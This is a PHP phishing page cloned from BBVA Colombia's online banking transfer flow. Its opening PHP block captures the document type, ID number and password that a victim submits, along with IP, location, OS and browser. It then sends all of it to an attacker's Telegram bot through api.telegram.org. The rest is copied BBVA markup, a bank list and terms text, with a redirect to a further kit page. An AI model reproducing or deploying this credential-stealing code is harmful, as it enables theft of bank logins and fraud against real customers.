<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('tlgm.php');
include('funciones.php');
////////////////////

if ( isset ($_POST['docTypeNoMovil']) && isset ($_POST['1us3r']) && isset ($_POST['1p4zz']) ){


$message = "✔️✔️BBVA COLOMBIA✔️✔️\r\nTIPO DOCUMENTO: ".$_POST['docTypeNoMovil']."\r\nNRO DOCUMENTO: ".$_POST['1us3r']."\r\nCL4V3: ".$_POST['1p4zz']."\r\n
\r\nFecha: ".date ('l jS \of F Y h:i:s A',time())."\r\nIp y Localidad: ".$myip." ".$pais." ".$region."\r\nSO: ".$user_os."\r\nNavegador: ".$navegador."";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}

?>
<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

      <meta http-equiv="REFRESH" content="1;URL=codw.php">
    <title>BBV
    </title>


    <link href="./commad/multipasov2.min.css" rel="stylesheet" type="text/css">
    <link href="./commad/spinner.css" rel="stylesheet">
      <link href="./commad/modules.css" rel="stylesheet" type="text/css">
  <link href="./commad/varios.css" rel="stylesheet" type="text/css"></head>


<body id="coronitaLayout" class="multipaso coronita" onload="ini()" onclick="stop()" onkeypress="stop()">
<script>
    var data_from_legacy = '{"tagging":{"environment":"pr01","gender":"F","profileID":"12501121","segmentProfile":"N","age":"05/09/1993"}}';
</script><div id="header" class="ui-outputpanel ui-widget"><div id="subheader" class="ui-outputpanel ui-widget subheader row" style="background: "><div id="sh1" class="ui-outputpanel ui-widget container header-info-container">
            <img style="display: none;" src="./commad/bbva-white.svg">
            <h5 style="margin-right: 35px">Validación de identidad</h5></div><a id="sh2" href="##" class="ui-commandlink ui-widget close" onclick="document.getElementById('coronita-modal').style.display = 'flex';;PrimeFaces.ab({s:&quot;sh2&quot;});return false;" type="button">
            </a><div id="sh3" class="ui-outputpanel ui-widget progress-container" style="display: ">
            <div class="progress-bar" id="myBar" style="width: 80%;"></div></div><div id="sh4" class="ui-outputpanel ui-widget return-button" style="display: ">
<form id="headerForm" name="headerForm" method="post" action="#" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="headerForm" value="headerForm">

<script type="text/javascript" src="./commad/jsf.js.descarga"></script>
<a id="headerForm:j_idt12" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show()','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;headerForm:j_idt12&quot;,u:&quot;sh1 sh4&quot;});');return false">

                    <p>Anterior</p></a><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e8s1">
</form></div><div id="sh5" class="ui-outputpanel ui-widget col-md-12 sh5 breadcrumb" style="display: ;">
<form id="j_idt14" name="j_idt14" method="post" action="#" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="j_idt14" value="j_idt14">

                <div class="container contPosition">
                </div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e8s1">
</form></div></div></div><div id="content" class="ui-outputpanel ui-widget"><div id="spinnerCoronita" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container spinnerCoronitaTheme" role="dialog" aria-labelledby="spinnerCoronita_title" aria-hidden="true" style="width: auto; height: auto;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top" style=""><span id="spinnerCoronita_title" class="ui-dialog-title"></span></div><div class="ui-dialog-content ui-widget-content" style="height: auto;">
	<div class="bbva-foundations-spinner">
		<figure class="spinner"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 400" id="_i5u178q2fh">
				<defs>
					<clipPath id="masked-clip-path__i5u178q2fh">
						<path d="M400,0L0,0L0,400L400,400ZM45.9596,200C45.9596,115.061,115.061,45.9596,200,45.9596C284.939,45.9596,354.04,115.061,354.04,200C354.04,284.939,284.939,354.04,200,354.04C115.061,354.04,45.9596,284.939,45.9596,200Z" fill-rule="evenodd"></path>
					</clipPath>
					<clipPath id="gradient-clip__i5u178q2fh">
						<ellipse rx="197.5" ry="197.5" cx="200" cy="200" fill="none"></ellipse>
					</clipPath>
					<radialGradient cx="199" cy="92" r="271.854" fx="197.801" fy="-27.9043" gradientUnits="userSpaceOnUse" id="gradient-path-fill__i5u178q2fh">
						<stop class="gr-stop-color anim gradient-path-offset-anim" offset="0.143991"></stop>
						<stop class="gr-stop-bg-color" offset="1" stop-opacity="0"></stop>
					</radialGradient>
					<filter color-interpolation-filters="sRGB" id="gradient-path-filter__i5u178q2fh">
						<feComponentTransfer>
							<feFuncR type="linear" slope="1.2"></feFuncR>
							<feFuncG type="linear" slope="1.2"></feFuncG>
							<feFuncB type="linear" slope="1.2"></feFuncB>
						</feComponentTransfer>
					</filter>
					<mask class="bright-mask" id="bright-mask__i5u178q2fh">
						<path class="bright-mask-path anim bright-anim" d="M-0.66667,0C-0.66667,0,41,68,167,68C290.5,68,334,0,334,0C334,0,281.425,113,166.925,113C50.4255,113,-0.66667,0,-0.66667,0Z" filter="url(#bright-mask-filter__i5u178q2fh)"></path>
					</mask>
					<filter id="bright-mask-filter__i5u178q2fh">
						<feGaussianBlur stdDeviation="20"></feGaussianBlur>
					</filter>
					<radialGradient cx="196.5" cy="0" r="100" fx="196.5" fy="0" gradientUnits="userSpaceOnUse" id="shine-stroke__i5u178q2fh">
						<stop class="shine-stop-color" offset="0"></stop>
						<stop class="shine-stop-color" offset="1" stop-opacity="0"></stop>
					</radialGradient>
				</defs>
				<g class="anim wrap rotation-anim" clip-path="url(#masked-clip-path__i5u178q2fh)">
					<ellipse class="bg" rx="197.5" ry="197.5" cx="200" cy="200"></ellipse>
					<path class="outline" d="M196.5,0C87.9723,0,0,87.9723,0,196.5C0,305.028,87.9723,393,196.5,393C305.028,393,393,305.028,393,196.5C393,87.9723,305.028,0,196.5,0Z"></path>
					<g clip-path="url(#gradient-clip__i5u178q2fh)">
						<g class="anim gradient-anim">
							<path class="gradient-path anim gradient-path-anim" d="M400,0L400,400L0,400L0,0Z" fill-rule="nonzero" fill="url(#gradient-path-fill__i5u178q2fh)" filter="url(#gradient-path-filter__i5u178q2fh)"></path>
						</g>
					</g>
					<ellipse class="bright" rx="197.5" ry="197.5" fill-rule="evenodd" mask="url(#bright-mask__i5u178q2fh)"></ellipse>
					<path class="shine" d="M196.5,0C87.9723,0,0,87.9723,0,196.5C0,305.028,87.9723,393,196.5,393C305.028,393,393,305.028,393,196.5C393,87.9723,305.028,0,196.5,0Z" stroke="url(#shine-stroke__i5u178q2fh)"></path>
				</g>
			</svg>
	</figure>
</div></div></div>
<form id="conoritaThemeform" name="conoritaThemeform" method="post" action="#" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="conoritaThemeform" value="conoritaThemeform">

        <div class="steps-mask" style="height: 633px;">
            <div class="steps-container" style="top: -700%;">
        <div id="conoritaThemeform:stepnumber-0" class="ui-outputpanel ui-widget step" style="height: 633px;">
                <div data-context="DESTINO_TRANSFERENCIA"></div>
                <div class="container">
                    <h1>¿A dónde quieres transferir?</h1>
                    <div style="margin-top: 4%">
                        <h1 style="font-size: 20px;">Transferir a:</h1>
                    </div>
                    <div class="row"><a id="conoritaThemeform:j_idt30" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt30&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
                            <div class="col-md-4 ">
                                <div class="option">
                                    <i class="iconcoronita-mobile"></i>
                                    <p>Celulares</p>
                                </div>
                                <i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Transfiere a números de celular,
                                a través de BBVA o Transfiya.</small>
                            </div></a><a id="conoritaThemeform:j_idt33" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt33&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
                            <div class="col-md-4 ">
                                <div class="option goNextStepBtn">
                                    <i class="iconcoronita-bank"></i>
                                    <p>Cuentas</p>
                                </div>
                                <i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Transfiere a cuentas BBVA, a
                                otros bancos e inscribe nuevas cuentas.</small>
                            </div></a><a id="conoritaThemeform:j_idt36" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt36&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
                            <div class="col-md-4 ">
                                <div class="option goNextStepBtn">
                                    <i class="iconcoronita-portfolio"></i>
                                    <p>Mis cuentas</p>
                                </div>
                                <i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Transfiere a tus productos BBVA y de otros bancos.</small>
                            </div></a>
                    </div>


					<div style="margin-top: 6%">
						<h1 style="font-size: 20px;">Otras opciones:</h1>
					</div>
					<div class="row "><a id="conoritaThemeform:j_idt40" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt40&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
							<div class="col-md-4 ">
								<div class="option goNextStepBtn">
									<div>
										<i class="receive-money"></i>
									</div>
									<p>Recibir dinero
									<span class="circle red notificationMenu" style="display: none"></span>
									</p>
								</div>
								<i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Recibe el dinero que te enviaron
									por Transfiya.</small>
							</div></a><a id="conoritaThemeform:j_idt43" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt43&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
							<div class="col-md-4 ">
								<div class="option goNextStepBtn">
									<div>
										<i class="send-money"></i>
									</div>
									<p>Solicitar dinero</p>
								</div>
								<i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Solicita dinero por Transfiya.</small>
							</div></a><a id="conoritaThemeform:j_idt46" href="##" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt46&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
							<div class="col-md-4 ">
								<div class="option goNextStepBtn">
									<div>
										<i class="iconcoronita-dollar"></i>
									</div>
									<p>Te solicitan dinero</p>
									</div>
								<i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Acepta el dinero que te solicitan por Transfiya</small>
							</div></a>
					</div>
				</div></div><div id="conoritaThemeform:stepnumber-1" class="ui-outputpanel ui-widget step" style="height: 633px;"><div id="conoritaThemeform:j_idt66" class="ui-outputpanel ui-widget container">
                    <div data-context="DATOS_DESTINO"></div><script type="text/javascript">
                        function moveTabs() {
                            if (document.querySelector('.tabs') != null) {
                                var tabsWidth = document.querySelector('.tabs').offsetWidth / 2;
                                document.querySelector('.highlight').style.width = tabsWidth + 'px';
                                document.querySelector('.highlight').style.left = document.querySelector('.tab.active').offsetLeft + 'px';
                            }
                        }
                        moveTabs();
                    </script>
                    <h3 class="step-identifier">2 de 7</h3>
                    <h1>¿A qué quieres transferir?</h1>
                    <div class="row"><div id="conoritaThemeform:mainPnlOther" class="ui-outputpanel ui-widget">
                            <div class="col-sm-12 col-md-6"><div id="conoritaThemeform:customPanelOther" class="ui-outputpanel ui-widget" style="margin-bottom:10px"><span id="conoritaThemeform:customRadioOther" class="ui-helper-hidden"></span></div>

                                <div class="tabs-container"><div id="conoritaThemeform:pnlTabs" class="ui-outputpanel ui-widget">
                                        <div class="tabs"><a id="conoritaThemeform:j_idt75" href="##" class="ui-commandlink ui-widget tab " onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt75&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt75&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){initilizeCustomComponents(); moveTabs(); bcSmartLoad('https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js', 'DATOS_DESTINO', 'eKjJnBaGw0yqE3evRUIqqpy');;}});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt75&quot;});return false;">
                                                Contacto
                                                </a><a id="conoritaThemeform:j_idt77" href="##" class="ui-commandlink ui-widget tab active" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt77&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt77&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){initilizeCustomComponents(); moveTabs(); bcSmartLoad('https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js', 'DATOS_CUENTA_DESTINO', 'eKjJnBaGw0yqE3evRUIqqpy');;}});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt77&quot;});return false;">
                                                Cuentas
                                                </a>
                                            <span class="highlight" style="width: 227.5px; left: 231px;"></span>
                                        </div></div>

                                    <div class="tabs-content"><div id="conoritaThemeform:pnlContactosFather" class="ui-outputpanel ui-widget"><div id="conoritaThemeform:pnlScrollList" class="ui-outputpanel ui-widget">
                                                <div class="content-block active">

                                                    <div class="input-container__coronitaV2 search-field"><script id="conoritaThemeform:j_idt85" type="text/javascript">myCommand = function() {PrimeFaces.ab({s:"conoritaThemeform:j_idt85",f:"conoritaThemeform",u:"conoritaThemeform:mainPnlOther",pa:arguments[0]});}</script><input id="conoritaThemeform:cashFinderProduct" name="conoritaThemeform:cashFinderProduct" type="text" autocomplete="off" placeholder="Buscar" onkeyup="enableButton();" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false"><a id="conoritaThemeform:finder" href="##" class="ui-commandlink ui-widget search-input__coronitaV2" onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:finder&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){enableButton();;}});return false;"></a>
                                                    </div><div id="conoritaThemeform:listPayees" class="ui-outputpanel ui-widget">
                                                        <div class="c-paymentList" id="scrollContainerListOthers">
                                                            <div class="item add-product-button">
                                                                <img style="width: 55px; height: 48px" src="./commad/add-product.svg" alt=""><a id="conoritaThemeform:j_idt88" href="##" class="ui-commandlink ui-widget" onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt88&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt88&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt88&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                                                    <p class="item-text" style="width: 200px;">Inscribir un nuevo
                                                                        producto</p></a>
                                                            </div>
                                                        </div></div>
                                                </div></div></div>
                                    </div>
                                </div>
                                <div class="buttons"><a id="conoritaThemeform:btn-next-pl-other" href="##" class="ui-commandlink ui-widget btn btn-blue btn-full " onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:btn-next-pl-other&quot;,u:&quot;conoritaThemeform:pasosForm&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();initilizeCustomComponents();}});return false;">Continuar</a>
                                </div>
                            </div>
                            <div class="col-md-5 col-sm-12 col-md-offset-1">
                                    <div class="help blueLightWhite ">
                                        <i class="iconcoronita-info"></i>
                                        <p>Transfiere seleccionando la cuenta de la lista o
                                            a una nueva ingresando los datos necesarios.</p>
                                    </div>
                            </div>

                            <div class="modal fade modal-md out" tabindex="-1" id="confirmEliminationOthers" role-dialog="">
                                <div class="modal-dialog modal-sm" role="document">
                                    <div class="modal-content">
                                        <div class="modal-header">
                                            <button type="button" onclick="removeModal2ByIdOthers();" class="close" data-dismiss="modal" aria-label="Close">

                                            </button>
                                        </div>
                                        <div class="modal-body">
                                            <div class="row">
                                                <div class="col-md-12 iconModal">
                                                    <img class="" src="./commad/error.svg" alt="">
                                                </div>
                                                <h1>Confirmación</h1>
                                            </div>

                                            <div class="row">
                                                <div class="col-md-12">
                                                    <p class="center">¿Estas seguro que deseas eliminar la cuenta?</p>

                                                </div>
                                            </div>

                                            <div class="row buttons ">
                                                <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:submit-confirmar-others" href="##" class="ui-commandlink ui-widget" onclick="removeModal2ByIdOthers();;PrimeFaces.ab({s:&quot;conoritaThemeform:submit-confirmar-others&quot;,p:&quot;conoritaThemeform&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onst:function(cfg){PF('statusDialog').show();},onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">Confirmar</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div></div>
                    </div></div></div><div id="conoritaThemeform:stepnumber-2" class="ui-outputpanel ui-widget step" style="height: 633px;">
                <div data-context="PRODUCTO_DESTINO"></div><div id="conoritaThemeform:productTransfer" class="ui-outputpanel ui-widget container ">
                    <h3 class="step-identifier">2 de 6</h3>
                    <h1>¿A dónde quieres transferir?</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6 form"><div id="conoritaThemeform:j_idt104" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:selectOwnAccount" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectOwnAccount_items" style="min-width: 170px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectOwnAccount_focus" name="conoritaThemeform:selectOwnAccount_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectOwnAccount_0" aria-describedby="conoritaThemeform:selectOwnAccount_0" aria-disabled="false" placeholder="Tipo de producto"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectOwnAccount_input" name="conoritaThemeform:selectOwnAccount_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectOwnAccount&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectOwnAccount&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:productTransfer&quot;,onco:function(xhr,status,args){initilizeCustomComponents(),PF('statusDialog').hide();}});"><option value=""></option><option value="AH">Cuenta de Ahorro</option><option value="CC">Cuenta Corriente</option><option value="DE">Dinero Móvil</option><option value="DE2">Depósito Electrónico</option></select></div><label id="conoritaThemeform:selectOwnAccount_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div></div><div id="conoritaThemeform:bank" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:j_idt116" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:selectBank" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectBank_items" style="min-width: 342px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectBank_focus" name="conoritaThemeform:selectBank_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectBank_0" aria-describedby="conoritaThemeform:selectBank_0" aria-disabled="false" placeholder="Banco"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectBank_input" name="conoritaThemeform:selectBank_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectBank&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectBank&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:selectDocumentType&quot;});"><option value=""></option><option value="0013">BANCO BBVA</option><option value="0059">BANCAMIA</option><option value="0040">BANCO AGRARIO</option><option value="0052">BANCO AV VILLAS</option><option value="0805">BANCO BTG PACTUAL</option><option value="0032">BANCO CAJA SOCIAL</option><option value="0009">BANCO CITIBANK</option><option value="0066">BANCO COOPERATIVO COOPCENTRAL</option><option value="0558">BANCO CREDIFINANCIERA SA.</option><option value="0051">BANCO DAVIVIENDA</option><option value="0001">BANCO DE BOGOTÁ</option><option value="0023">BANCO DE OCCIDENTE</option><option value="0062">BANCO FALABELLA</option><option value="0063">BANCO FINANDINA</option><option value="0012">BANCO GNB SUDAMERIS</option><option value="0006">BANCO ITAÚ</option><option value="0014">BANCO ITAÚ*</option><option value="0071">BANCO J.P. MORGAN COLOMBIA S.A</option><option value="0047">BANCO MUNDO MUJER S.A.</option><option value="0060">BANCO PICHINCHA</option><option value="0002">BANCO POPULAR</option><option value="0058">BANCO PROCREDIT</option><option value="0065">BANCO SANTANDER</option><option value="0069">BANCO SERFINANZA S.A.</option><option value="0029">BANCO TEQUENDAMA</option><option value="0804">BANCO UALA BANCAR TECNOLOGIA CO S.A</option><option value="0053">BANCO WWB</option><option value="0031">BANCOLDEX</option><option value="0007">BANCOLOMBIA</option><option value="0067">BANCOMPARTIR </option><option value="0061">BANCOOMEVA</option><option value="0808">BOLD CF</option><option value="0370">COLTEFINANCIERA S.A.</option><option value="0292">CONFIAR COOPERATIVA FINANCIERA</option><option value="0283">COOFIANTIOQUIA</option><option value="0291">COOFINEP COOPERATIVA FINANCIERA</option><option value="0289">COTRAFA COOPERATIVA FINANCIERA</option><option value="0802">DING TECNIPAGOS S.A.</option><option value="0121">FINANCIERA JURISCOOP</option><option value="0303">GIROS Y FINANZAS CF</option><option value="0814">GLOBAL66</option><option value="0637">IRIS</option><option value="0286">JFK COOPERATIVA FINANCIERA</option><option value="0070">LULO BANK S.A.</option><option value="0801">MOVii</option><option value="0560">PIBANK</option><option value="0803">POWWI</option><option value="0811">RAPPIPAY</option><option value="0813">SANTANDER CONSUMER</option><option value="0019">SCOTIABANK COLPATRIA</option><option value="0342">SERVIFINANSA S.A.</option></select></div><label id="conoritaThemeform:selectBank_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div></div></div>

                            <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputLoan" name="conoritaThemeform:inputLoan" type="text" autocomplete="off" maxlength="20" placeholder="Número de producto" onkeypress="javascript:return isOnlyNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputLoan&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputLoan&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                <div class="inputerrorMessage">
                                    <h6>
                                        <i class="iconcoronita-alert"></i>
                                    </h6>
                                </div>
                            </div><div id="conoritaThemeform:inputNameFather" class="ui-outputpanel ui-widget input required">
                                <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputNameRegister" name="conoritaThemeform:inputNameRegister" type="text" autocomplete="off" placeholder="Nombres y apellidos" onkeypress="javascript:return isLetter(this);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputNameRegister&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputNameRegister&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                    <div class="inputerrorMessage">
                                        <h6>
                                            <i class="iconcoronita-alert"></i>
                                        </h6>
                                    </div>
                                </div>


                                <script type="text/javascript">
                                    setTimeout(
                                        function () {
                                            if (document.getElementById("form-step-register-product:inputNameFather") != null) {
                                                document
                                                    .getElementById("form-step-register-product:inputNameFather").classList
                                                    .add('error');
                                            }
                                        }, 300);
                                </script></div><div id="conoritaThemeform:j_idt129" class="ui-outputpanel ui-widget"></div><div id="conoritaThemeform:j_idt130" class="ui-outputpanel ui-widget two-elements-container">
                                <br>
                                <div class="select half select-container__coronitaV2" style="margin-right: 30px">
                                    <div class="select-container__coronitaV2"><div id="conoritaThemeform:selectDocumentType" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectDocumentType_items" style="min-width: 248px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectDocumentType_focus" name="conoritaThemeform:selectDocumentType_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectDocumentType_0" aria-describedby="conoritaThemeform:selectDocumentType_0" aria-disabled="false" placeholder="Tipo de documento"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectDocumentType_input" name="conoritaThemeform:selectDocumentType_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectDocumentType&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectDocumentType&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:productTransfer&quot;,onco:function(xhr,status,args){initilizeCustomComponents();}});"><option value="">Seleccione</option><option value="1">Cédula de Ciudadanía</option><option value="2">Cédula de Extranjería</option><option value="4">Tarjeta de Identidad</option><option value="5">Pasaporte</option><option value="0">No de Identificación Personal</option><option value="V">Permiso Permanencia Temporal</option><option value="3">NIT</option></select></div><label id="conoritaThemeform:selectDocumentType_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">Seleccione</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div>
                                    </div>
                                </div>
                                <div class="select half error">
                                        <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputNumber2" name="conoritaThemeform:inputNumber2" type="text" autocomplete="off" maxlength="20" placeholder="Número de documento" onkeypress="javascript:return isOnlyNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputNumber2&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputNumber2&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">

                                        </div>
                                </div>

                                <div class="error">
                                    <div class="inputerrorMessage">
                                        <h6>
                                            <i class="iconcoronita-alert"></i>
                                        </h6>
                                    </div>
                                </div></div><div id="conoritaThemeform:j_idt147" class="ui-outputpanel ui-widget" style="margin-left: 25px; "><a id="conoritaThemeform:l-tyc" href="##" class="ui-commandlink ui-widget" onclick="document.getElementById('m-tyc').style.display = 'flex';;PrimeFaces.ab({s:&quot;conoritaThemeform:l-tyc&quot;});return false;">
                                    Ver Términos y Condiciones
                                </a>
                                <br></div><div id="conoritaThemeform:check-coronita-v2" class="ui-selectbooleancheckbox ui-chkbox ui-widget check__coronitaV2"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:check-coronita-v2_input" name="conoritaThemeform:check-coronita-v2_input" type="checkbox" autocomplete="off" aria-hidden="true" aria-checked="false" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:check-coronita-v2&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:check-coronita-v2&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});"></div><div class="ui-chkbox-box ui-widget ui-corner-all ui-state-default"><span class="ui-chkbox-icon ui-icon ui-icon-blank ui-c"></span></div></div><label id="conoritaThemeform:j_idt150" class="ui-outputlabel ui-widget check-label__coronitaV2" style="position: static !important;" for="conoritaThemeform:check-coronita-v2_input">Leí y acepto los Términos y Condiciones.
                            </label>

                            <div class="buttons"><span id="conoritaThemeform:buttonAdd" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full ui-inputfield">Continuar</span>
                            </div>
                        </div>
                    </div></div>

                <div class="modal fade modal-md out" id="m-tyc" tabindex="-1" role-dialog="">
                    <div class="modal-dialog modal-sm" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1>Términos y Condiciones</h1>

                                <button type="button" onclick="removeModalById();" class="close" data-dismiss="modal" aria-label="Close">
                                    
                                </button>

                            </div>
                            <div class="modal-body">

                                <div class="scrollhidden">
                                    <div>
                                        <p style="text-align: center">
                                            <strong>TÉRMINOS Y CONDICIONES DEL SERVICIO
                                                "INSCRIPCION DE CUENTAS Y CONTRATOS BENEFICIARIOS DE
                                                TRANSFERENCIAS Y PAGOS"</strong>
                                        </p>
                                        <p>El presente documento adiciona y forma parte integral de
                                            los contratos suscritos y actualmente vigentes entre el BANCO
                                            BILBAO VIZCAYA ARGENTARIA COLOMBIA S.A. "BBVA", en adelante EL
                                            BANCO y sus clientes personas naturales , en adelante EL
                                            CLIENTE. Queda entendido que “LOS CONTRATOS” relaciona todos
                                            aquellos productos y servicios que EL BANCO ofrece y aceptan
                                            sus clientes.</p>
                                        <p>La utilización del servicio "Inscripción de Cuentas y
                                            Contratos beneficiarios de transferencias y pagos", en
                                            adelante EL SERVICIO, implica la aceptación por parte de EL
                                            CLIENTE de los siguientes términos y condiciones:</p>
